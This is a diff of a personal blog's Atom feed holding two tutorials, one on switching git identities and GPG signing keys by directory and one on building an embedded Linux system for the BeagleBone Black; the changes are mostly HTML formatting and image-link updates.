@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/ef_blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/ef_blog/" rel="alternate" type="text/html" /><updated>2021-06-05T09:05:35-07:00</updated><id>http://localhost:4000/ef_blog/feed.xml</id><title type="html">Emmet Friel</title><subtitle>cyber security blog</subtitle><author><name>Emmet Friel</name></author><entry><title type="html">Working with multiple GPG keys across multiple git identities</title><link href="http://localhost:4000/ef_blog/misc/multipleGPG.html" rel="alternate" type="text/html" title="Working with multiple GPG keys across multiple git identities" /><published>2020-09-20T00:00:00-07:00</published><updated>2020-09-20T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/misc/multipleGPG</id><content type="html" xml:base="http://localhost:4000/ef_blog/misc/multipleGPG.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/ef_blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/ef_blog/" rel="alternate" type="text/html" /><updated>2021-06-05T09:33:04-07:00</updated><id>http://localhost:4000/ef_blog/feed.xml</id><title type="html">Emmet Friel</title><subtitle>cyber security blog</subtitle><author><name>Emmet Friel</name></author><entry><title type="html">Working with multiple GPG keys across multiple git identities</title><link href="http://localhost:4000/ef_blog/misc/multipleGPG.html" rel="alternate" type="text/html" title="Working with multiple GPG keys across multiple git identities" /><published>2020-09-20T00:00:00-07:00</published><updated>2020-09-20T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/misc/multipleGPG</id><content type="html" xml:base="http://localhost:4000/ef_blog/misc/multipleGPG.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Its common to have multiple Git identities when working across different projects which can be difficult to manage but for the majority of us we usually have two git identities for signing commits: one for work use and one for personal use. This tutorial explains how to switch git identities automatically based on what directory your in.&lt;br /&gt;&lt;/p&gt;
 
@@ -10,14 +10,14 @@
 
 &lt;h1 id=&quot;configuring-multiple-git-identities&quot;&gt;Configuring multiple git identities&lt;/h1&gt;
 
-&lt;p&gt;The main Git configuration file is &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitconfig&lt;/code&gt; which can be found in the &lt;code class=&quot;highlighter-rouge&quot;&gt;$HOME&lt;/code&gt; directory and is specfic to each user. Create two new git configuration files for work and personal use, see below.&lt;/p&gt;
+&lt;p&gt;The main Git configuration file is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig&lt;/code&gt; which can be found in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$HOME&lt;/code&gt; directory and is specfic to each user. Create two new git configuration files for work and personal use, see below.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 John John  234 May  8 15:52  .gitconfig
 &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 John John   95 Sep 20 15:02  .gitconfig-local
 &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 John John  137 Sep 20 15:02  .gitconfig-work
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;By default we are going to configure git to use our personal git identity for everything unless we are in a specific directory. Open up &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitconfig-local&lt;/code&gt; with a text editor and insert the contents based on your personal git identity:&lt;/p&gt;
+&lt;p&gt;By default we are going to configure git to use our personal git identity for everything unless we are in a specific directory. Open up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-local&lt;/code&gt; with a text editor and insert the contents based on your personal git identity:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .gitconfig-local 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;user]
@@ -26,9 +26,9 @@
   signingkey &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OEE3389VBDJH4531
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;Note: You can find the key ID for your GPG secret key via &lt;code class=&quot;highlighter-rouge&quot;&gt;gpg --list-secret-keys --keyid-format LONG&lt;/code&gt; which is then &lt;code class=&quot;highlighter-rouge&quot;&gt;sec   rsa3072/OEE3389VBDJH4531&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note: You can find the key ID for your GPG secret key via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gpg --list-secret-keys --keyid-format LONG&lt;/code&gt; which is then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sec   rsa3072/OEE3389VBDJH4531&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;Save and Exit. Repeat the same for &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitconfig-work&lt;/code&gt; replacing name, email and signingkey ID with your git identity for work.&lt;/p&gt;
+&lt;p&gt;Save and Exit. Repeat the same for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-work&lt;/code&gt; replacing name, email and signingkey ID with your git identity for work.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .gitconfig-work 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;user]
@@ -37,7 +37,7 @@
   signingkey &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BM2095449YAW90L1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Save and Exit. Create a new folder in Documents directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;work-projects&lt;/code&gt; which will be used for work related projects. Open the main git configuration file: &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitconfig&lt;/code&gt; and append the following to the file:&lt;/p&gt;
+&lt;p&gt;Save and Exit. Create a new folder in Documents directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;work-projects&lt;/code&gt; which will be used for work related projects. Open the main git configuration file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig&lt;/code&gt; and append the following to the file:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# default case&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;include]
@@ -47,7 +47,7 @@
         path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/.gitconfig-work
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The includeIf condition allows us to automatically switch git identities when inside the work-projects directory to &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitconfig-work&lt;/code&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;p&gt;The includeIf condition allows us to automatically switch git identities when inside the work-projects directory to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-work&lt;/code&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;test-automated-switching&quot;&gt;Test automated switching&lt;/h1&gt;
 
@@ -61,7 +61,7 @@ emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.si
 OEE3389VBDJH4531
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Git detects our configuration based on &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitconfig-local&lt;/code&gt;. Navigate into &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents/work-projects&lt;/code&gt;, clone any git project into work-projects directory, cd into it and then run the following commands again:&lt;/p&gt;
+&lt;p&gt;Git detects our configuration based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-local&lt;/code&gt;. Navigate into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Documents/work-projects&lt;/code&gt;, clone any git project into work-projects directory, cd into it and then run the following commands again:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~/Documents/work-projects/tictactoe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.email 
 johndoe@company.net
@@ -69,7 +69,7 @@ emmet@homepc:~/Documents/work-projects/tictactoe&lt;span class=&quot;nv&quot;&gt
 BM2095449YAW90L1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;You can see Git automatically switching identities based on directories allowing us to manage multiple GPG keys when signing commits.&lt;/p&gt;</content><author><name>Emmet Friel</name></author><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/misc/github.jpeg" /></entry><entry><title type="html">Building an Embedded Linux Distribution on a Beaglebone Black ARM Cortex-A8</title><link href="http://localhost:4000/ef_blog/embedded/embedded-linux.html" rel="alternate" type="text/html" title="Building an Embedded Linux Distribution on a Beaglebone Black ARM Cortex-A8" /><published>2020-05-16T00:00:00-07:00</published><updated>2020-05-16T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/embedded/embedded-linux</id><content type="html" xml:base="http://localhost:4000/ef_blog/embedded/embedded-linux.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;You can see Git automatically switching identities based on directories allowing us to manage multiple GPG keys when signing commits.&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="misc" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/misc/github.jpeg" /><media:content medium="image" url="http://localhost:4000/ef_blog/misc/github.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Building an Embedded Linux Distribution on a Beaglebone Black ARM Cortex-A8</title><link href="http://localhost:4000/ef_blog/embedded/embedded-linux.html" rel="alternate" type="text/html" title="Building an Embedded Linux Distribution on a Beaglebone Black ARM Cortex-A8" /><published>2020-05-16T00:00:00-07:00</published><updated>2020-05-16T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/embedded/embedded-linux</id><content type="html" xml:base="http://localhost:4000/ef_blog/embedded/embedded-linux.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;This tutorial will show you how to build the latest 5.5.5 kernel on the Beaglebone Black with a root filesystem that is less than 10MB which can be easily ported to other boards and IOT devices. The tutorial will consist of using crosstool-NG to build the toolchain, using Make to build the bootloader, kernel and device trees and lastly using Buildroot to compile the root filesystem. Starting off on embedded Linux I’d recommend getting the&lt;a href=&quot;https://www.amazon.co.uk/Mastering-Embedded-Linux-Programming-potential/dp/1787283283&quot; target=&quot;_blank&quot;&gt; Mastering Embedded Linux Programming book&lt;/a&gt; which this tutorial takes pieces of inspiration from and takes you through an in-depth description of the entire project lifecycle. Building an embedded Linux distribution from scratch requires four main elements:&lt;/p&gt;
 
@@ -119,7 +119,7 @@ BM2095449YAW90L1
 
 &lt;h2 id=&quot;dependencies&quot;&gt;Dependencies&lt;/h2&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get install python3-dev python2.7-dev libncurses5-dev automake libsdl1.2-dev bison chrpath git  g++ gawk texinfo libtool-bin flex gperf lbexpat1-dev
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;python3-dev python2.7-dev libncurses5-dev automake libsdl1.2-dev bison chrpath git  g++ gawk texinfo libtool-bin flex gperf lbexpat1-dev
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;download--install&quot;&gt;Download &amp;amp; Install&lt;/h2&gt;
@@ -131,7 +131,7 @@ emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&g
 emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./bootstrap
 emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./configure &lt;span class=&quot;nt&quot;&gt;--enable-local&lt;/span&gt;
 emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
-emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make install
+emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Note on some of the commands:&lt;/p&gt;
@@ -265,17 +265,17 @@ warranty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; not even &lt;span class=&
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/embedded/bb-linux/tty-serial.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/tty-serial.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Power on the board and add the USB device filter to the virtual machine using the “+” symbol.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/embedded/bb-linux/vbox-usb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/vbox-usb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Install picocom to communicate with the beaglebone: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install picocom&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Connect to the beaglebone board: &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo picocom -b 115200 /dev/ttyUSB0&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Install picocom to communicate with the beaglebone: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt-get install picocom&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Connect to the beaglebone board: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo picocom -b 115200 /dev/ttyUSB0&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;download-and-configure-u-boot&quot;&gt;Download and Configure U-Boot&lt;/h2&gt;
@@ -337,9 +337,9 @@ SPL / TPL  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot
 
 &lt;p&gt;Copy SPL and TPL files onto the boot partition, unmount device and insert SD card into board. Hold down the boot button before powering on the board otherwise the Beaglebone will boot from onboard eMMC storage.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cp MLO u-boot.img /media/emmet/BOOT
-emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sync
-emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;umount /media/emmet/BOOT 
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;MLO u-boot.img /media/emmet/BOOT
+emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sync
+&lt;/span&gt;emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;umount /media/emmet/BOOT 
 emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;umount /media/emmet/root
 emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;picocom &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 115200 /dev/ttyUSB0 
 
@@ -352,7 +352,7 @@ U-Boot 2020.04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Jun 15 2020 - 15:29
 CPU  : AM335X-GP rev 2.1
 Model: TI AM335x BeagleBone Black
 DRAM:  512 MiB
-WDT:   Started with servicing &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;60s timeout&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+WDT:   Started with servicing &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;60s &lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 NAND:  0 MiB
 MMC:   OMAP SD/MMC: 0, OMAP SD/MMC: 1
 Loading Environment from FAT... &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; Warning - bad CRC, using default environment
@@ -372,7 +372,7 @@ Hit any key to stop autoboot:  0
 
 &lt;p&gt;The Linux kernel is the core component of the operating system that is responsible for providing an interface to the user space via the C library, interfacing with the hardware using device drivers and lastly, managing resources such as memory, storage and the execution of tasks.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/embedded/bb-linux/kernel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/kernel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;download-the-source-code&quot;&gt;Download the source code&lt;/h2&gt;
 &lt;p&gt;The Linux Kernel main branch is managed by its creator, Linus Torvalds and you can download the source code from GitHub:&lt;/p&gt;
@@ -383,20 +383,20 @@ emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/
 emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; kernel-bb-5.5.5 &lt;span class=&quot;c&quot;&gt;# creates a local branch&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;You can find all the different kernel configuration files based on the architecture in &lt;code class=&quot;highlighter-rouge&quot;&gt;linux/arch/&amp;lt;architecture&amp;gt;/configs&lt;/code&gt;. The Beaglebone Black is based on the ARM V7 architecture so the configuration we are going to use is: &lt;strong&gt;multi_v7_defconfig&lt;/strong&gt;. Clean the project before starting:&lt;/p&gt;
+&lt;p&gt;You can find all the different kernel configuration files based on the architecture in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux/arch/&amp;lt;architecture&amp;gt;/configs&lt;/code&gt;. The Beaglebone Black is based on the ARM V7 architecture so the configuration we are going to use is: &lt;strong&gt;multi_v7_defconfig&lt;/strong&gt;. Clean the project before starting:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make distclean
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;configure-and-build-the-kernel&quot;&gt;Configure and Build the kernel&lt;/h2&gt;
-&lt;p&gt;Select the ARM V7 kernel configuration file and launch the menuconfig window. In the case of building the kernel, the architecture has to be expressed in addition to CROSS_COMPILE and the various types of architectures that can be supplied can be seen in the &lt;code class=&quot;highlighter-rouge&quot;&gt;arch&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;Select the ARM V7 kernel configuration file and launch the menuconfig window. In the case of building the kernel, the architecture has to be expressed in addition to CROSS_COMPILE and the various types of architectures that can be supplied can be seen in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch&lt;/code&gt; directory.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;ARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm &lt;span class=&quot;nv&quot;&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm-cortex_a8-linux-gnueabihf- multi_v7_defconfig
 emmet@homepc:/home/emmet/Documents/linux&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nv&quot;&gt;ARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;arm menuconfig
 
 &lt;span class=&quot;c&quot;&gt;#Modifications&lt;/span&gt;
 General setup  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-emmetfriel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Local version - append to kernel release 
-General setup  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;beaglebone-ef&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; Default hostname
+General setup  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;beaglebone-ef&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; Default &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Build and compile the kernel:&lt;/p&gt;
@@ -408,11 +408,11 @@ General setup  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&
 5.5.5-emmetfriel
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The output files are in the &lt;code class=&quot;highlighter-rouge&quot;&gt;arch/arm/boot/&lt;/code&gt; directory. Copy the kernel image (zImage) and the device tree blob &lt;code class=&quot;highlighter-rouge&quot;&gt;arch/arm/boot/dts/am335x-boneblack.dtb&lt;/code&gt; onto the boot partition of the SD card.&lt;/p&gt;
+&lt;p&gt;The output files are in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch/arm/boot/&lt;/code&gt; directory. Copy the kernel image (zImage) and the device tree blob &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch/arm/boot/dts/am335x-boneblack.dtb&lt;/code&gt; onto the boot partition of the SD card.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cp zImage /media/emmet/BOOT
-emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cp dts/am335x-boneblack.dtb /media/emmet/BOOT
-emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sync 
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;zImage /media/emmet/BOOT
+emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;dts/am335x-boneblack.dtb /media/emmet/BOOT
+emmet@homepc:/home/emmet/Documents/linux/arch/arm/boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;predefining-boot-parameters-using-uenvtxt&quot;&gt;Predefining boot parameters using uEnv.txt&lt;/h2&gt;
@@ -481,7 +481,7 @@ make menuconfig
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Personalizing the OS
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;System configuration  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buildroot-ef&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; System hostname
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;System configuration  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buildroot-ef&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; System &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Welcome to Emmets Buildroot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; System banner
              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enable root login with password
              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password123&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Root password
@@ -504,14 +504,14 @@ Text editors and viewers  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;s
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/buildroot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
